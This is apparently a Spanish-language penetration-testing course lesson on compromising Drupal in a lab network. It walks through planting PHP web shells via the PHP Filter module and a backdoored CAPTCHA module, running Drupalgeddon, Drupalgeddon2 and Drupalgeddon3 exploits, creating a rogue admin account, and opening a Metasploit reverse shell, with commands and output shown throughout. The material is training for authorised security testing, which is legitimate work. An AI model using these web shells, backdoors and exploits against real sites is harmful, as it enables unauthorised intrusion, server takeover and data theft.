Ahora que hemos confirmado que estamos enfrentando a Drupal y hemos identificado la versión, veamos qué configuraciones incorrectas y vulnerabilidades podemos descubrir para intentar obtener acceso a la red interna.

A diferencia de algunos CMS, obtener una shell en un host de Drupal a través de la consola de administración no es tan fácil como simplemente editar un archivo PHP encontrado dentro de un tema o subir un script PHP malicioso.

---

## Leveraging the PHP Filter Module

En versiones anteriores de Drupal (antes de la versión 8), era posible iniciar sesión como administrador y habilitar el módulo `PHP filter`, que "Permite que el código/snippets PHP embebidos sean evaluados."

`http://drupal-qa.inlanefreight.local/#overlay=admin/modules`

![](https://academy.hackthebox.com/storage/modules/113/drupal_php_module.png)

Desde aquí, podríamos marcar la casilla junto al módulo y desplazarnos hacia abajo hasta `Save configuration`. Luego, podríamos ir a Content --> Add content y crear una `Basic page`.

`http://drupal-qa.inlanefreight.local/#overlay=node/add`

![](https://academy.hackthebox.com/storage/modules/113/basic_page.png)

Ahora podemos crear una página con un snippet PHP malicioso como el siguiente. Nombramos el parámetro con un hash md5 en lugar del común `cmd` para practicar el no dejar potencialmente una puerta abierta a un atacante durante nuestra evaluación. Si usamos el estándar `system($_GET['cmd']);`, nos exponemos a un atacante de "drive-by" que podría encontrar nuestra web shell. Aunque es poco probable, ¡mejor prevenir que lamentar!

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

`http://drupal-qa.inlanefreight.local/#overlay=node/add/page`

![](https://academy.hackthebox.com/storage/modules/113/basic_page_shell_7v2.png)

También queremos asegurarnos de configurar el desplegable `Text format` en `PHP code`. Después de hacer clic en guardar, seremos redirigidos a la nueva página, en este ejemplo `http://drupal-qa.inlanefreight.local/node/3`. Una vez guardado, podemos solicitar ejecutar comandos en el navegador añadiendo `?dcfdd5e021a869fcc6dfaef8bf31377e=id` al final de la URL para ejecutar el comando `id` o usar `cURL` en la línea de comandos. Desde aquí, podríamos usar una línea de comando bash para obtener acceso de shell reverso.

```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Desde la versión 8 en adelante, el módulo `PHP Filter` no está instalado por defecto. Para aprovechar esta funcionalidad, tendríamos que instalar el módulo nosotros mismos. Dado que estaríamos cambiando y añadiendo algo a la instancia de Drupal del cliente, podríamos querer consultar con ellos primero. Comenzaríamos descargando la versión más reciente del módulo desde el sitio web de Drupal.

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Una vez descargado, ir a `Administration` > `Reports` > `Available updates`.

Nota: La ubicación puede diferir según la versión de Drupal y puede estar en el menú Extend.

`http://drupal.inlanefreight.local/admin/reports/updates/install`

![](https://academy.hackthebox.com/storage/modules/113/install_module.png)

Desde aquí, hacer clic en `Browse,` seleccionar el archivo desde el directorio en el que lo descargamos, y luego hacer clic en `Install`.

Una vez instalado el módulo, podemos hacer clic en `Content` y crear una nueva página básica, similar a como lo hicimos en el ejemplo de Drupal 7. Nuevamente, asegúrese de seleccionar `PHP code` desde el desplegable `Text format`.

Con cualquiera de estos ejemplos, debemos mantener informado a nuestro cliente y obtener permiso antes de realizar este tipo de cambios. Además, una vez que hayamos terminado, debemos eliminar o deshabilitar el módulo `PHP Filter` y eliminar cualquier página que hayamos creado para obtener ejecución remota de código.

---

## Uploading a Backdoored Module

Drupal permite a los usuarios con permisos adecuados subir un nuevo módulo. Se puede crear un módulo con puerta trasera añadiendo una shell a un módulo existente. Los módulos se pueden encontrar en el sitio web de drupal.org. Vamos a elegir un módulo como [CAPTCHA](https://www.drupal.org/project/captcha). Desplácese hacia abajo y copie el enlace para el archivo tar.gz [archivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

Descargue el archivo y extraiga su contenido.

```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

Cree una web shell PHP con el contenido:

```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```

A continuación, necesitamos crear un archivo .htaccess para darnos acceso a la carpeta. Esto es necesario ya que Drupal niega el acceso directo a la carpeta /modules.

```apache
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

La configuración anterior aplicará reglas para la carpeta / cuando solicitemos un archivo en /modules. Copie ambos archivos a la carpeta captcha y cree un archivo comprimido.

```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```

Suponiendo que tenemos acceso administrativo al sitio web, haga clic en `Manage` y luego en `Extend` en la barra lateral. A continuación, haga clic en el botón `+ Install new module`, y seremos llevados a la página de instalación, como `http://drupal.inlanefreight.local/admin/modules/install` Busque el archivo Captcha con puerta trasera y haga clic en `Install`.

`http://drupal.inlanefreight.local/core/authorize.php`

![](https://academy.hackthebox.com/storage/modules/113/module_installed.png)

Una vez que la instalación tenga éxito, navegue a `/modules/captcha/shell.php` para ejecutar comandos.

```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Leveraging Known Vulnerabilities

A lo largo de los años, el núcleo de Drupal ha sufrido algunas vulnerabilidades graves de ejecución remota de código, cada una apodada `Drupalgeddon`. Al momento de escribir, existen 3 vulnerabilidades Drupalgeddon.

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), conocida como Drupalgeddon, afecta a las versiones 7.0 hasta 7.31 y se solucionó en la versión 7.32. Esta fue una falla de inyección SQL preautenticada que podría usarse para subir un formulario malicioso o crear un nuevo usuario administrador.
    
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), también conocida como Drupalgeddon2, es una vulnerabilidad de ejecución remota de código, que afecta a las versiones de Drupal anteriores a 7.58 y 8.5.1. La vulnerabilidad ocurre debido a una sanitización de entrada insuficiente durante el registro de usuarios, lo que permite que se inyecten comandos a nivel del sistema de manera maliciosa.
    
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), también conocida como Drupalgeddon3, es una vulnerabilidad de ejecución remota de código que afecta a múltiples versiones de Drupal 7.x y 8.x. Esta falla explota una validación incorrecta en la API de formularios.
    

Vamos a recorrer la explotación de cada una de estas.

---

## Drupalgeddon

Como se mencionó anteriormente, esta falla puede explotarse aprovechando una inyección SQL preautenticada que puede usarse para subir código malicioso o agregar un usuario administrador. Intentemos agregar un nuevo usuario administrador con este script [PoC](https://www.exploit-db.com/exploits/34992). Una vez que se agrega un usuario administrador, podríamos iniciar sesión y habilitar el módulo `PHP Filter` para lograr la ejecución remota de código.

Ejecutar el script con el flag `-h` nos muestra el menú de ayuda.

```python
python2.7 drupalgeddon.py 

  ______                          __     _______  _______ _____    
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
 |.  |   \

|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
 |:  1    /          |__|                 |   |  |:  1   | |:  |   
 |::.. . /                                |   |  |::.. . | |::.|   
 `------'                                 `---'  `-------' `---'   
  _______       __     ___       __            __   __             
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|                               
 |::.. . |            |::.|                                        
 `-------'            `---'                                        
                                                                   
                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

			  Discovered by:

			  Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww



Usage: drupalgeddon.py -t http[s]://TARGET_URL -u USER -p PASS


Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        Insert URL: http[s]://www.victim.com
  -u USERNAME, --username=USERNAME
                        Insert username
  -p PWD, --pwd=PWD     Insert password
```

Aquí vemos que necesitamos proporcionar la URL de destino y un nombre de usuario y contraseña para nuestra nueva cuenta de administrador. Ejecutemos el script y veamos si obtenemos un nuevo usuario administrador.

```python
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

Ahora veamos si podemos iniciar sesión como administrador. ¡Podemos! Ahora, desde aquí, podríamos obtener una shell a través de los diversos medios discutidos anteriormente en esta sección.

`http://drupal-qa.inlanefreight.local/user#overlay=admin/people`

![](https://academy.hackthebox.com/storage/modules/113/drupalgeddon.png)

También podríamos usar el módulo Metasploit [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) para explotar esto.

---

## Drupalgeddon2

Podemos usar este [PoC](https://www.exploit-db.com/exploits/44448) para confirmar esta vulnerabilidad.

```python
python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
```

Podemos verificar rápidamente con `cURL` y ver que el archivo `hello.txt` fue efectivamente subido.

```bash
curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```

Ahora vamos a modificar el script para obtener ejecución remota de código subiendo un archivo PHP malicioso.

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

A continuación, reemplazamos el comando `echo` en el script de explotación con un comando para escribir nuestro script PHP malicioso.

```bash
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

Luego, ejecutamos el script de explotación modificado para subir nuestro archivo PHP malicioso.

```python
python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php
```

Finalmente, podemos confirmar la ejecución remota de código usando `cURL`.

```bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Drupalgeddon3

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) es una vulnerabilidad de ejecución remota de código autenticada que afecta a [múltiples versiones](https://www.drupal.org/sa-core-2018-004) del núcleo de Drupal. Requiere que un usuario tenga la capacidad de eliminar un nodo. Podemos explotar esto usando Metasploit, pero primero debemos iniciar sesión y obtener una cookie de sesión válida.

![](https://academy.hackthebox.com/storage/modules/113/burp.png)

Una vez que tengamos la cookie de sesión, podemos configurar el módulo de explotación de la siguiente manera.

```bash
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

Module options (exploit/multi/http/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80                                                                                yes       The target port (TCP)
   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                                                                                 yes

       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   User register form with exec
```

Si tiene éxito, obtendremos una shell reversa en el host de destino.

```bash
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid

Server username: www-data (33)


meterpreter > sysinfo

Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
```

---

## Onwards

Hemos enumerado y atacado algunos de los CMS más prevalentes: WordPress, Drupal y Joomla. A continuación, pasemos a Tomcat, que ha estado poniendo una sonrisa en la cara de los pentesters durante años.